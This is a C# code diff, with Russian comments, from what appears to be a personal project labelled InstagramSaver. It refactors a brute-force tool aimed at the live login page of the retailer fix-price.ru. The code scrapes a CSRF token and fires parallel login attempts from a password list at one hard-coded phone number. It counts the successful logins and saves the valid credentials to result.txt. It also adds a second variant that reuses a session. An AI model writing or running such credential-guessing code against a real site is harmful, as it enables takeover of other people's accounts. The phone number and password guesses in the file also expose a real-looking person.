@@ -127,7 +127,7 @@ namespace InstagramSaver
         /// Пытаемся ломать)
         /// </summary>
         /// <returns></returns>
-        public void Brute()
+        public async Task BruteFirst()
         {
             List<Task<IDocument>> documents = new List<Task<IDocument>>();
             //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
@@ -139,10 +139,33 @@ namespace InstagramSaver
             foreach (var password in Passwords)
             {
                 documents.Add(Connect("+7 (999) 539-67-65", password));//Первый способ(каждый раз новая сессия)
+                //documents.Add(ConnectPlus("+7 (999) 539-67-65", password));//Из под одной сессии
+            }
+            Task.WaitAll(documents.ToArray());//Ждём пока все задачи(попытки войти) выполняцца
+        }
+        /// <summary>
+        /// Пытаемся ломать)
+        /// </summary>
+        /// <returns></returns>
+        public async Task BruteSecond()
+        {
+            List<Task<IDocument>> documents = new List<Task<IDocument>>();
+            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
+            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
+            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)2"));
+            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)2"));
+            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
+            //Task.WaitAll(documents.ToArray());
+            foreach (var password in Passwords)
+            {
+                //documents.Add(Connect("+7 (999) 539-67-65", password));//Первый способ(каждый раз новая сессия)
                 documents.Add(ConnectPlus("+7 (999) 539-67-65", password));//Из под одной сессии
             }
             Task.WaitAll(documents.ToArray());//Ждём пока все задачи(попытки войти) выполняцца
         }
+
+
+
         /// <summary>
         /// Первый способ
         /// Каждая попытка коннекта в новой сессии - грузим новые куки и токен
@@ -156,7 +179,6 @@ namespace InstagramSaver
 .WithDefaultCookies()
 .WithDefaultLoader();
             var context = BrowsingContext.New(config);
-            Console.WriteLine($"{login} {password}");
             var document = await context.OpenAsync("https://fix-price.ru/personal/");
             var sessionCsrf = document.QuerySelector("input[name=CSRF]").GetAttribute("value");
             var dictonary = new Dictionary<string, string>();
@@ -174,6 +196,7 @@ namespace InstagramSaver
             {
                 Console.WriteLine($"Успешный вход {login} {password}");
                 File.WriteAllText("result.txt", $"{login} {password}");
+                Founded++;
             }
             else
             {
@@ -229,18 +252,37 @@ namespace InstagramSaver
         {
             var fixprice = new FixPriceBF("test.txt");
             //fixprice.Connect("qwe", "qwe").Wait();
+            FirstVariant(fixprice);
+
+        }
+
+        private static void FirstVariant(FixPriceBF fixprice)
+        {
             Stopwatch watch = new Stopwatch();
             watch.Start();
-            fixprice.Brute();
+            fixprice.BruteFirst().Wait();
             watch.Stop();
             Console.WriteLine($"Проверено {fixprice.Passwords.Count} паролей за {watch.Elapsed}");
             Console.WriteLine($"Валидных: {fixprice.Founded}");
             Console.WriteLine($"Валидные в result.txt");
 
-            File.AppendAllText("log.txt", $"Проверено {fixprice.Passwords.Count} паролей за {watch.Elapsed}\n");
+            File.AppendAllText("log1.txt", $"Проверено {fixprice.Passwords.Count} паролей за {watch.Elapsed}\n");
 
             Console.ReadKey();
-            
+        }
+        private static void SecondVariant(FixPriceBF fixprice)
+        {
+            Stopwatch watch = new Stopwatch();
+            watch.Start();
+            fixprice.BruteSecond().Wait();
+            watch.Stop();
+            Console.WriteLine($"Проверено {fixprice.Passwords.Count} паролей за {watch.Elapsed}");
+            Console.WriteLine($"Валидных: {fixprice.Founded}");
+            Console.WriteLine($"Валидные в result.txt");
+
+            File.AppendAllText("log2.txt", $"Проверено {fixprice.Passwords.Count} паролей за {watch.Elapsed}\n");
+
+            Console.ReadKey();
         }
 
         private static async Task Open()
